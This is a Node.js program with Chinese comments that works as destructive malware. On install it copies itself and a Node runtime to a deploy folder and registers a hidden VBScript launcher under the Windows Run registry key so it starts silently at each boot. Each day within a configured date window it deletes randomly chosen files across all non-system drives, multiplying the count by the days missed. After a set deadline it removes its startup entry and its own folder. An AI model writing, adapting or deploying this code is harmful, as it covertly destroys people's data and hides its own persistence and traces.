/**
 * 随机删除文件，配置见同目录 config.json
 * 安装: node init.js install（需已安装 Node.js；或从源目录运行自动检测安装）
 * 日志: run.log / install.log
 */

const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const CONFIG_FILE = 'config.json';
const LOG_FILE = 'run.log';
const INSTALL_LOG_FILE = 'install.log';

const DEFAULT_CONFIG = {
  startDate: null,
  endDate: null,
  uninstallAt: null,
  deleteCount: 40,
  lastRunTime: null,
  deleteFolderPaths: [],
  registryScope: 'HKCU',
  regName: 'InitTask',
  maxDepth: 20,
  enableLog: false,
};

const SKIP_DIR_NAMES = new Set([
  '$recycle.bin',
  'system volume information',
  'windows',
  'program files',
  'program files (x86)',
  'programdata',
  'recovery',
  'boot',
  'efi',
  'msocache',
  'perflogs',
  'appdata',
]);

let logPath = '';
let loggingEnabled = true;

function log(msg) {
  if (!loggingEnabled) return;
  const line = `[${new Date().toISOString()}] ${msg}`;
  if (logPath) {
    try {
      fs.appendFileSync(logPath, `${line}\n`, 'utf8');
    } catch {
      /* ignore */
    }
  }
}

function expandEnv(p) {
  return String(p).replace(/%([^%]+)%/g, (_, name) => process.env[name] ?? `%${name}%`);
}

function ensureDir(dirPath) {
  const resolved = path.resolve(expandEnv(dirPath));
  if (!fs.existsSync(resolved)) {
    fs.mkdirSync(resolved, { recursive: true });
  }
  return resolved;
}

function readConfigFile(configPath) {
  if (!fs.existsSync(configPath)) {
    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
  }
  try {
    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    return { config: { ...DEFAULT_CONFIG, ...raw }, usedDefault: false };
  } catch {
    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
  }
}

function normalizeRuntimeConfig(config, baseDir) {
  config.deployPath = baseDir;
  config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || DEFAULT_CONFIG.deleteCount);
  config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || DEFAULT_CONFIG.maxDepth);
  config.deleteFolderPaths = Array.isArray(config.deleteFolderPaths)
    ? config.deleteFolderPaths.map(expandEnv).filter(Boolean)
    : [];
  config.enableLog = config.enableLog !== false;
  return config;
}

function loadConfig() {
  const configPath = path.join(__dirname, CONFIG_FILE);
  const { config, usedDefault } = readConfigFile(configPath);
  normalizeRuntimeConfig(config, __dirname);
  return { config, configPath, usedDefault };
}

function loadInstallConfig(sourceDir) {
  const configPath = path.join(sourceDir, CONFIG_FILE);
  const { config, usedDefault } = readConfigFile(configPath);
  if (!config.deployPath) {
    throw new Error('config.json 缺少 deployPath，无法安装');
  }
  const deployPath = path.resolve(expandEnv(config.deployPath));
  const scope = String(config.registryScope || DEFAULT_CONFIG.registryScope).toUpperCase();
  if (scope !== 'HKCU' && scope !== 'HKLM') {
    throw new Error(`registryScope 必须为 HKCU 或 HKLM，当前: ${scope}`);
  }
  const regName = config.regName || DEFAULT_CONFIG.regName;
  const removeKeys = Array.isArray(config.removeConfigKeysAfterDeploy)
    ? config.removeConfigKeysAfterDeploy.map(String)
    : ['deployPath'];
  return {
    config,
    configPath,
    usedDefault,
    deployPath,
    registryScope: scope,
    regName,
    removeKeys,
    enableLog: config.enableLog !== false,
  };
}

function writeDeployConfig(sourceConfigPath, destConfigPath, removeKeys) {
  const raw = JSON.parse(fs.readFileSync(sourceConfigPath, 'utf8'));
  const strip = new Set(
    [...removeKeys, 'removeConfigKeysAfterDeploy'].map((k) => String(k).toLowerCase())
  );
  const out = {};
  for (const [key, value] of Object.entries(raw)) {
    if (!strip.has(key.toLowerCase())) out[key] = value;
  }
  fs.writeFileSync(destConfigPath, `${JSON.stringify(out, null, 2)}\n`, 'utf8');
}

function findNodeExe() {
  try {
    const out = execSync('where node', { encoding: 'utf8', windowsHide: true }).trim();
    const first = out.split(/\r?\n/).find(Boolean);
    if (first && fs.existsSync(first)) return first;
  } catch {
    /* try fallbacks */
  }
  const candidates = [
    path.join(process.env.ProgramFiles || '', 'nodejs', 'node.exe'),
    path.join(process.env['ProgramFiles(x86)'] || '', 'nodejs', 'node.exe'),
  ];
  for (const p of candidates) {
    if (p && fs.existsSync(p)) return p;
  }
  return null;
}

function setRegistryRunValue(scope, regName, regValue) {
  const regKey = getRegistryRunKey(scope);
  if (!regKey) throw new Error(`无效的 registryScope: ${scope}`);
  // 只转义引号，不要把 \ 变成 \\（否则注册表里会是 C:\\Windows，开机无法执行）
  const data = regValue.replace(/"/g, '\\"');
  execSync(`reg add "${regKey}" /v "${regName}" /t REG_SZ /d "${data}" /f`, {
    stdio: 'ignore',
    windowsHide: true,
  });
}

function getDeployNodeExe(deployPath) {
  return path.join(deployPath, 'node', 'node.exe');
}

/** 复制当前 node 到部署目录，避免开机时 nvm 路径不可用 */
function ensureDeployNode(nodeExe, deployPath) {
  const dest = getDeployNodeExe(deployPath);
  ensureDir(path.dirname(dest));
  fs.copyFileSync(nodeExe, dest);
  return dest;
}

/** 生成 run.vbs，以隐藏窗口方式启动 node（注册表指向 wscript //B） */
function writeRunVbs(vbsPath, nodeExe, initJsPath, workDir) {
  const q = (s) => String(s).replace(/"/g, '""');
  const body = [
    'Option Explicit',
    '',
    'Dim fso, bootLog, bootLogFile, sh, nodeExe, initJs',
    'Set fso = CreateObject("Scripting.FileSystemObject")',
    `bootLog = fso.BuildPath("${q(workDir)}", "boot.log")`,
    'On Error Resume Next',
    'Set bootLogFile = fso.OpenTextFile(bootLog, 8, True)',
    'bootLogFile.WriteLine Now & " run.vbs start"',
    'bootLogFile.Close',
    '',
    `nodeExe = "${q(nodeExe)}"`,
    `initJs = "${q(initJsPath)}"`,
    'If Not fso.FileExists(nodeExe) Then',
    '  Set bootLogFile = fso.OpenTextFile(bootLog, 8, True)',
    '  bootLogFile.WriteLine Now & " ERROR node missing: " & nodeExe',
    '  bootLogFile.Close',
    '  WScript.Quit 1',
    'End If',
    'Set sh = CreateObject("Wscript.Shell")',
    `sh.CurrentDirectory = "${q(workDir)}"`,
    'sh.Run """" & nodeExe & """ """ & initJs & """", 0, False',
    '',
  ].join('\r\n');
  fs.writeFileSync(vbsPath, body, 'utf8');
}

function installSilentLauncher(deployPath, scope, regName, nodeExe, initFileName) {
  const vbsPath = path.join(deployPath, 'run.vbs');
  const initJs = path.join(deployPath, initFileName);
  writeRunVbs(vbsPath, nodeExe, initJs, deployPath);
  const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
  const regValue = `"${wscript}" //B //Nologo "${vbsPath}"`;
  setRegistryRunValue(scope, regName, regValue);
  return vbsPath;
}

function shouldRunUninstall() {
  return process.argv.slice(2).includes('uninstall');
}

function shouldRunInstall() {
  if (process.argv.slice(2).includes('install')) return true;
  const configPath = path.join(__dirname, CONFIG_FILE);
  if (!fs.existsSync(configPath)) return false;
  try {
    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!raw.deployPath) return false;
    const target = path.resolve(expandEnv(String(raw.deployPath)));
    return path.resolve(__dirname) !== target;
  } catch {
    return false;
  }
}

function performInstall() {
  const sourceDir = __dirname;
  const installCfg = loadInstallConfig(sourceDir);
  loggingEnabled = installCfg.enableLog;
  logPath = installCfg.enableLog
    ? path.join(installCfg.deployPath, INSTALL_LOG_FILE)
    : '';

  if (installCfg.usedDefault) {
    log(`配置文件不存在或无效: ${installCfg.configPath}`);
  }

  ensureDir(installCfg.deployPath);
  log(`安装开始 Computer=${process.env.COMPUTERNAME} User=${process.env.USERNAME}`);
  log(`部署目录: ${installCfg.deployPath} 注册表: ${installCfg.registryScope}`);

  if (installCfg.registryScope === 'HKLM') {
    log('WARN: registryScope=HKLM 通常需要管理员权限');
  }

  const systemNode = findNodeExe();
  if (!systemNode) {
    throw new Error('未找到 Node.js，请先安装 Node.js 后执行: node init.js install');
  }
  const nodeExe = ensureDeployNode(systemNode, installCfg.deployPath);
  log(`使用 Node（已复制到部署目录）: ${nodeExe}`);

  const selfPath = path.join(sourceDir, path.basename(__filename));
  const deployInit = path.join(installCfg.deployPath, path.basename(__filename));
  fs.copyFileSync(selfPath, deployInit);

  const deployConfigPath = path.join(installCfg.deployPath, CONFIG_FILE);
  writeDeployConfig(installCfg.configPath, deployConfigPath, installCfg.removeKeys);
  log(`已写入部署配置（移除字段: ${installCfg.removeKeys.join(', ')}）`);

  const runVbsPath = installSilentLauncher(
    installCfg.deployPath,
    installCfg.registryScope,
    installCfg.regName,
    nodeExe,
    path.basename(__filename)
  );
  log(`静默启动: ${runVbsPath}（注册表经 wscript //B，无 CMD 窗口）`);
  log(`已注册开机启动: ${getRegistryRunKey(installCfg.registryScope)}\\${installCfg.regName}`);
  log('安装完成');
  log('========== 安装结束 ==========\n');
}

function saveConfig(configPath, config) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
}

function parseDateOnly(str) {
  if (!str) return null;
  const d = new Date(`${str}T00:00:00`);
  return Number.isNaN(d.getTime()) ? null : d;
}

/** 解析卸载时间：支持 YYYY-M-D、YYYY-MM-DD、带时分秒（本地时间） */
function parseDateTime(str) {
  if (!str) return null;
  const s = String(str).trim();
  const m = s.match(
    /^(\d{4})-(\d{1,2})-(\d{1,2})(?:[T\s](\d{1,2}):(\d{2})(?::(\d{2}))?)?$/
  );
  if (m) {
    const isoDate = `${m[1]}-${String(m[2]).padStart(2, '0')}-${String(m[3]).padStart(2, '0')}`;
    let iso;
    if (m[4] !== undefined) {
      iso = `${isoDate}T${String(m[4]).padStart(2, '0')}:${m[5]}:${m[6] ? String(m[6]).padStart(2, '0') : '00'}`;
    } else {
      iso = `${isoDate}T23:59:59`;
    }
    const d = new Date(iso);
    return Number.isNaN(d.getTime()) ? null : d;
  }
  const normalized = s.includes('T') ? s : s.replace(' ', 'T');
  const d = new Date(normalized);
  return Number.isNaN(d.getTime()) ? null : d;
}

function getUninstallDeadline(config) {
  const at = parseDateTime(config.uninstallAt);
  if (at) return at;
  if (config.uninstallAt) {
    log(`WARN: uninstallAt 无法解析「${config.uninstallAt}」，将回退使用 endDate`);
  }
  if (config.endDate) return parseDateTime(config.endDate);
  return null;
}

function isPastUninstallDeadline(deadline) {
  return deadline != null && new Date() >= deadline;
}

function getRegistryRunKey(scope) {
  const s = String(scope || 'HKCU').toUpperCase();
  if (s !== 'HKCU' && s !== 'HKLM') return null;
  return `${s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
}

function isUnsafeDeletePath(dirPath) {
  const normalized = path.resolve(dirPath).replace(/\//g, '\\');
  return /^[A-Za-z]:\\?$/.test(normalized);
}

/** 删除开机启动注册表项 */
function removeRegistryRun(scope, regName) {
  const regKey = getRegistryRunKey(scope);
  if (!regKey || !regName) {
    log('注册表配置无效，跳过删除启动项');
    return false;
  }
  try {
    execSync(`reg delete "${regKey}" /v "${regName}" /f`, {
      stdio: 'ignore',
      windowsHide: true,
    });
    log(`已删除注册表启动项: ${regKey}\\${regName}`);
    return true;
  } catch {
    log(`注册表启动项不存在或删除失败: ${regKey}\\${regName}`);
    return false;
  }
}

/** 进程退出后静默延迟删除部署目录（wscript 等待数秒再删，无 CMD 窗口、无循环重试） */
function scheduleDeployFolderDelete(deployPath) {
  if (isUnsafeDeletePath(deployPath)) {
    log(`拒绝删除盘符根目录: ${deployPath}`);
    return false;
  }
  const cleanupVbs = path.join(
    process.env.TEMP || process.env.TMP || '.',
    `init-cleanup-${Date.now()}.vbs`
  );
  const q = (s) => String(s).replace(/"/g, '""');
  const vbsBody = [
    'Option Explicit',
    'WScript.Sleep 6000',
    'On Error Resume Next',
    'Dim fso',
    'Set fso = CreateObject("Scripting.FileSystemObject")',
    `If fso.FolderExists("${q(deployPath)}") Then fso.DeleteFolder "${q(deployPath)}", True`,
    'fso.DeleteFile WScript.ScriptFullName, True',
    '',
  ].join('\r\n');
  try {
    fs.writeFileSync(cleanupVbs, vbsBody, 'utf8');
    const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
    const child = spawn(wscript, ['//B', '//Nologo', cleanupVbs], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true,
    });
    child.unref();
    log(`已安排静默删除部署目录（约 6 秒后）: ${deployPath}`);
    return true;
  } catch (err) {
    log(`安排删除部署目录失败: ${err.message}`);
    return false;
  }
}

/** 到期自动卸载：删注册表启动项 + 延迟删除部署目录 */
function performUninstall(config) {
  const deployPath = config.deployPath || __dirname;
  const scope = config.registryScope || DEFAULT_CONFIG.registryScope;
  const regName = config.regName || DEFAULT_CONFIG.regName;
  log(`自动卸载开始: deploy=${deployPath} scope=${scope} reg=${regName}`);
  removeRegistryRun(scope, regName);
  return scheduleDeployFolderDelete(deployPath);
}

/** 转为本地年月日 0 点 */
function toDateOnly(d) {
  return new Date(d.getFullYear(), d.getMonth(), d.getDate());
}

function formatDateOnly(d) {
  const y = d.getFullYear();
  const m = String(d.getMonth() + 1).padStart(2, '0');
  const day = String(d.getDate()).padStart(2, '0');
  return `${y}-${m}-${day}`;
}

/** 今天与 lastRunTime 相差的日历天数；无 lastRunTime 返回 null */
function daysSinceLastRun(lastRunTime) {
  if (!lastRunTime) return null;
  const last = toDateOnly(new Date(lastRunTime));
  const today = toDateOnly(new Date());
  return Math.round((today - last) / 86400000);
}

function isWithinDateRange(startDate, endDate) {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const start = parseDateOnly(startDate);
  const end = parseDateOnly(endDate);
  if (start && today < start) return false;
  if (end && today > end) return false;
  return true;
}

function getNonCDrives() {
  const drives = [];
  for (const letter of 'DEFGHIJKLMNOPQRSTUVWXYZ') {
    const root = `${letter}:\\`;
    try {
      if (fs.existsSync(root)) drives.push(root);
    } catch {
      /* skip */
    }
  }
  return drives;
}

function resolveScanRoots(deleteFolderPaths) {
  if (deleteFolderPaths.length > 0) {
    return deleteFolderPaths.map((p) => ensureDir(p));
  }
  const drives = getNonCDrives();
  log(`deleteFolderPaths 为空，扫描非 C 盘: ${drives.join(', ') || '无'}`);
  return drives;
}

function shouldSkipDir(dirPath) {
  const name = path.basename(dirPath).toLowerCase();
  return SKIP_DIR_NAMES.has(name) || name.startsWith('$');
}

function collectFiles(root, maxDepth, depth = 0, out = []) {
  if (depth > maxDepth) return out;

  let entries;
  try {
    entries = fs.readdirSync(root, { withFileTypes: true });
  } catch {
    return out;
  }

  for (const ent of entries) {
    const full = path.join(root, ent.name);
    if (ent.isDirectory()) {
      if (!shouldSkipDir(full)) collectFiles(full, maxDepth, depth + 1, out);
      continue;
    }
    if (!ent.isFile()) continue;
    try {
      if (fs.statSync(full).isFile()) out.push(full);
    } catch {
      /* skip */
    }
  }
  return out;
}

function pickRandom(arr, n) {
  const copy = [...arr];
  const count = Math.min(n, copy.length);
  const picked = [];
  for (let i = 0; i < count; i++) {
    const idx = Math.floor(Math.random() * copy.length);
    picked.push(copy[idx]);
    copy.splice(idx, 1);
  }
  return picked;
}

function main() {
  logPath = path.join(__dirname, LOG_FILE);
  const { config, configPath, usedDefault } = loadConfig();
  loggingEnabled = config.enableLog;
  if (usedDefault) {
    log(`配置文件不存在或无效，使用默认配置: ${configPath}`);
  } else {
    log(`配置文件: ${configPath}`);
  }
  log(`删除数量: ${config.deleteCount}，扫描深度: ${config.maxDepth}`);

  const uninstallDeadline = getUninstallDeadline(config);
  if (uninstallDeadline) {
    log(`计划卸载时间: ${uninstallDeadline.toLocaleString()}`);
  }
  if (isPastUninstallDeadline(uninstallDeadline)) {
    log('已到指定卸载时间，执行自动卸载');
    performUninstall(config);
    log('========== 任务结束 ==========\n');
    return;
  }

  if (!isWithinDateRange(config.startDate, config.endDate)) {
    log(
      `当前日期不在执行范围内（${config.startDate || '无'} ~ ${config.endDate || '无'}），已跳过`
    );
    log('========== 任务结束 ==========\n');
    return;
  }

  const today = toDateOnly(new Date());
  const todayStr = formatDateOnly(today);
  const dayGap = daysSinceLastRun(config.lastRunTime);

  if (config.lastRunTime) {
    const lastStr = formatDateOnly(new Date(config.lastRunTime));
    log(`上次执行: ${config.lastRunTime}`);
    log(`今天: ${todayStr}，上次执行日: ${lastStr}，间隔天数: ${dayGap}`);
  } else {
    log(`今天: ${todayStr}，尚无执行记录（首次执行）`);
  }

  if (dayGap === 0) {
    log('当天日期与上次执行日相同，跳过不执行');
    log('========== 任务结束 ==========\n');
    return;
  }

  let effectiveDeleteCount = config.deleteCount;
  if (dayGap !== null && dayGap > 0) {
    effectiveDeleteCount = config.deleteCount * dayGap;
    log(
      `间隔 ${dayGap} 天，删除数量: ${config.deleteCount} × ${dayGap} = ${effectiveDeleteCount}`
    );
  } else if (dayGap === null) {
    log(`删除数量: ${effectiveDeleteCount}`);
  } else {
    log(`间隔天数异常(${dayGap})，使用基础删除数量: ${effectiveDeleteCount}`);
  }

  const roots = resolveScanRoots(config.deleteFolderPaths);
  if (roots.length === 0) {
    log('无可用扫描路径，已退出');
    log('========== 任务结束 ==========\n');
    return;
  }
  log(`扫描路径: ${roots.join('; ')}`);

  const allFiles = [];
  for (const root of roots) {
    const before = allFiles.length;
    collectFiles(root, config.maxDepth, 0, allFiles);
    log(`扫描 ${root} +${allFiles.length - before} 个文件`);
  }

  if (allFiles.length === 0) {
    log('未找到可删除文件，已退出');
    log('========== 任务结束 ==========\n');
    return;
  }

  const targets = pickRandom(allFiles, effectiveDeleteCount);
  log(`随机选中 ${targets.length} 个文件（目标 ${effectiveDeleteCount}）`);

  let deleted = 0;
  let failed = 0;
  for (const file of targets) {
    try {
      fs.unlinkSync(file);
      log(`已删除: ${file}`);
      deleted++;
    } catch (err) {
      log(`删除失败: ${file} — ${err.message}`);
      failed++;
    }
  }

  config.lastRunTime = new Date().toISOString();
  saveConfig(configPath, config); // 无配置文件时会自动创建
  log(`完成: 成功 ${deleted}，失败 ${failed}`);
  log(`已更新 lastRunTime: ${config.lastRunTime}`);
  log('========== 任务结束 ==========\n');
}

function runUninstall() {
  const installCfg = loadInstallConfig(__dirname);
  loggingEnabled = installCfg.enableLog;
  logPath = installCfg.enableLog
    ? path.join(installCfg.deployPath, INSTALL_LOG_FILE)
    : '';
  log('手动卸载开始');
  performUninstall({
    deployPath: installCfg.deployPath,
    registryScope: installCfg.registryScope,
    regName: installCfg.regName,
  });
  log('========== 卸载结束 ==========\n');
}

try {
  if (shouldRunInstall()) {
    performInstall();
  } else if (shouldRunUninstall()) {
    runUninstall();
  } else {
    main();
  }
} catch (err) {
  if (!logPath) {
    logPath = path.join(
      __dirname,
      shouldRunInstall() || shouldRunUninstall() ? INSTALL_LOG_FILE : LOG_FILE
    );
  }
  try {
    const cfg = JSON.parse(
      fs.readFileSync(path.join(__dirname, CONFIG_FILE), 'utf8')
    );
    loggingEnabled = cfg.enableLog !== false;
  } catch {
    /* 使用默认 loggingEnabled */
  }
  const label = shouldRunInstall() ? '安装' : shouldRunUninstall() ? '卸载' : '任务';
  log(`${label}异常退出: ${err.message || err}`);
  log(`========== ${label}结束 ==========\n`);
  process.exit(1);
}
